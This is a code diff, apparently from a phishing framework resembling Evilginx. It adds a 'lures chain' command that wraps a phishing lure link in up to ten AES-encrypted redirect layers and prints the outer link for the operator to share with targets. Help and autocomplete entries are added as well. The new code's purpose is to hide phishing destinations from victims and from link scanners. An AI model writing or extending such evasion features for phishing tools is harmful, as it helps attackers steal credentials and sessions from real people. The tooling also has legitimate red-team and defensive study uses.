@@ -1104,6 +1104,86 @@ func (t *Terminal) handleLures(args []string) error {
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
+		case "chain":
+			if pn >= 2 {
+				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+				if err != nil {
+					return fmt.Errorf("chain: invalid lure id: %v", err)
+				}
+				l, err := t.cfg.GetLure(l_id)
+				if err != nil {
+					return fmt.Errorf("chain: %v", err)
+				}
+				pl, err := t.cfg.GetPhishlet(l.Phishlet)
+				if err != nil {
+					return fmt.Errorf("chain: %v", err)
+				}
+				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
+				if !ok || len(bhost) == 0 {
+					return fmt.Errorf("chain: no hostname set for phishlet '%s'", pl.Name)
+				}
+
+				depth := 3
+				if pn >= 3 {
+					d, err := strconv.Atoi(strings.TrimSpace(args[2]))
+					if err != nil || d < 1 || d > 10 {
+						return fmt.Errorf("chain: depth must be a number between 1 and 10")
+					}
+					depth = d
+				}
+
+				var base_url string
+				if l.Hostname != "" {
+					base_url = "https://" + l.Hostname
+				} else {
+					purl, err := pl.GetLureUrl(l.Path)
+					if err != nil {
+						return fmt.Errorf("chain: %v", err)
+					}
+					// strip the lure path to get just the base
+					base_url = "https://" + bhost
+					_ = purl
+				}
+				_ = base_url
+
+				// build final lure URL
+				var finalURL string
+				if l.Hostname != "" {
+					finalURL = "https://" + l.Hostname + l.Path
+				} else {
+					purl, err := pl.GetLureUrl(l.Path)
+					if err != nil {
+						return fmt.Errorf("chain: %v", err)
+					}
+					finalURL = purl
+				}
+
+				phishBase := "https://" + bhost
+				if l.Hostname != "" {
+					phishBase = "https://" + l.Hostname
+				}
+
+				outerURL, hops, err := GenerateRedirectChain(phishBase, finalURL, depth, t.cfg.GetRedirectChainSecret())
+				if err != nil {
+					return fmt.Errorf("chain: %v", err)
+				}
+
+				log.Info("generated %d-layer redirect chain for lure #%d (%s):", depth, l_id, l.Phishlet)
+				for i, hop := range hops {
+					if i == 0 {
+						log.Info("  layer %d [share this]: %s", i+1, higreen.Sprint(hop))
+					} else if i == len(hops)-1 {
+						log.Info("  layer %d [→ lure]:     %s", i+1, cyan.Sprint(hop))
+					} else {
+						log.Info("  layer %d:              %s", i+1, yellow.Sprint(hop))
+					}
+				}
+				log.Info("  final destination:     %s", dgray.Sprint(finalURL))
+				log.Info("")
+				log.Info("share the layer 1 link: %s", white.Sprint(outerURL))
+				return nil
+			}
+			return fmt.Errorf("incorrect number of arguments: lures chain <id> [depth]")
 		case "edit":
 			if pn == 4 {
 				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
@@ -1530,6 +1610,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
+			readline.PcItem("chain", readline.PcItemDynamic(t.luresIdPrefixCompleter)),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("webhook_telegram"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
@@ -1540,6 +1621,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
+	h.AddSubCommand("lures", []string{"chain"}, "chain <id> [depth]", "generates a multi-layer AES-encrypted redirect chain for lure <id> (default 3 layers, max 10)")
 	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
 	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
 	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
